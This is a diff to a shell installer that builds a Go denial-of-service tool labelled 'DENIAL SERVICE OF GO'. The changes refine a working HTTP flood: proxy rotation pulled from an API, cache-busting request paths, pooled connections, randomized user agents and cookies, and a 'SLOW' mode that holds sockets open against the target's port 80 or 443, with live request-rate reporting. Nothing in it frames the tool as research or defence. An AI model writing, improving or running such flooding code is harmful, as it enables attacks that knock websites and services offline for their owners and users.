@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (fixed version with no unused imports)
+# Create main.go file directly (CLEAN version - no unused imports)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -213,9 +213,6 @@ func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *Connecti
 		useProxy:   useProxy,
 		targetHost: targetHost,
 	}
-
-	fmt.Printf("[+] Creating connection pool with %d connections...\n", poolSize)
-
 	for i := 0; i < poolSize; i++ {
 		pool.clients[i] = pool.createClient()
 	}
@@ -298,11 +295,7 @@ func loadProxiesFromAPI() {
 	proxyMu.Lock()
 	proxies = newProxies
 	proxyMu.Unlock()
-
 	atomic.StoreUint64(&proxyIndex, 0)
-	if len(proxies) > 0 {
-		fmt.Printf("[+] Loaded %d proxies\n", len(proxies))
-	}
 }
 
 func proxyRefresher() {
@@ -419,9 +412,9 @@ func generateCookies() string {
 
 func main() {
 	runtime.GOMAXPROCS(runtime.NumCPU() * 4)
-	useProxy := len(os.Args) >= 5
-
-	if useProxy {
+	useProxy := false
+	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
+		useProxy = true
 		loadProxiesFromAPI()
 		if len(proxies) > 0 {
 			go proxyRefresher()
@@ -453,17 +446,11 @@ func main() {
 		os.Exit(1)
 	}
 
-	_, err := url.Parse(target)
-	if err != nil || !strings.HasPrefix(target, "http") {
-		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
+	if !strings.HasPrefix(target, "http") {
+		if strings.Contains(target, ":") {
 			target = "http://" + target
-		} else if !strings.HasPrefix(target, "http") {
+		} else {
 			target = "https://" + target
-		}
-		_, err = url.Parse(target)
-		if err != nil {
-			fmt.Println("Invalid target URL:", err)
-			os.Exit(1)
 		}
 	}
 
@@ -508,35 +495,33 @@ func main() {
 
 	for i := 0; i < workers; i++ {
 		wg.Add(1)
-		go func(id int) {
+		go func() {
 			defer wg.Done()
 			attackWorker(target, mode, done, stats, useProxy, connectionPool)
-		}(i)
+		}()
 	}
 
-	go func() {
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
-		for {
-			select {
-			case <-done:
-				fmt.Printf("\n[+] Attack completed!\n")
-				fmt.Printf("Target: %s\n", target)
-				fmt.Printf("Mode: %s\n", mode)
-				fmt.Printf("Duration: %d sec\n", durationSec)
-				fmt.Printf("Total requests: %d\n", stats.get())
-				fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/duration.Seconds())
-				return
-			case <-ticker.C:
-				elapsed := time.Since(startTime).Seconds()
-				rps := float64(stats.get()) / elapsed
-				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
-			}
+	ticker := time.NewTicker(1 * time.Second)
+	defer ticker.Stop()
+	
+	for {
+		select {
+		case <-done:
+			elapsed := time.Since(startTime).Seconds()
+			fmt.Printf("\n[+] Attack completed!\n")
+			fmt.Printf("Target: %s\n", target)
+			fmt.Printf("Mode: %s\n", mode)
+			fmt.Printf("Duration: %d sec\n", durationSec)
+			fmt.Printf("Total requests: %d\n", stats.get())
+			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
+			connectionPool.CloseIdleConnections()
+			return
+		case <-ticker.C:
+			elapsed := time.Since(startTime).Seconds()
+			rps := float64(stats.get()) / elapsed
+			fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
 		}
-	}()
-
-	wg.Wait()
-	connectionPool.CloseIdleConnections()
+	}
 }
 
 type atomicCounter struct {
@@ -558,8 +543,8 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			return
 		default:
 			client := pool.GetClient()
-
 			path := generatePath()
+			
 			if mode != "SLOW" && randInt(1, 100) <= 70 {
 				path += generateCacheBust()
 			}
@@ -579,16 +564,20 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			if mode == "SLOW" {
 				u, _ := url.Parse(target)
 				host := u.Hostname()
-				conn, err := net.DialTimeout("tcp", host+":80", 5*time.Second)
+				port := "80"
+				if u.Scheme == "https" {
+					port = "443"
+				}
+				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
 				if err != nil {
 					time.Sleep(200 * time.Millisecond)
 					continue
 				}
-				defer conn.Close()
 				conn.SetDeadline(time.Now().Add(300 * time.Second))
 				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
 				stats.inc()
 				time.Sleep(1 * time.Second)
+				conn.Close()
 				continue
 			}
 
@@ -761,10 +750,9 @@ echo
 
 # Compile
 echo -e " ${YELLOW}➤${NC} ${GREEN}Compiling...${NC}"
-BUILD_OUTPUT=$(go build -o main main.go 2>&1)
-BUILD_EXIT_CODE=$?
+go build -o main main.go
 
-if [ $BUILD_EXIT_CODE -eq 0 ]; then
+if [ $? -eq 0 ]; then
     chmod +x main
     echo -e " ${GREEN}✓ Compilation successful!${NC}"
     echo
@@ -790,10 +778,6 @@ if [ $BUILD_EXIT_CODE -eq 0 ]; then
     exit 0
 else
     echo -e " ${RED}✗ Compilation failed${NC}"
-    if [ -n "$BUILD_OUTPUT" ]; then
-        echo -e " ${RED}Error details:${NC}"
-        echo "$BUILD_OUTPUT"
-    fi
     echo
     echo -e " ${YELLOW}➤${NC} ${GREEN}Try running these commands manually:${NC}"
     echo
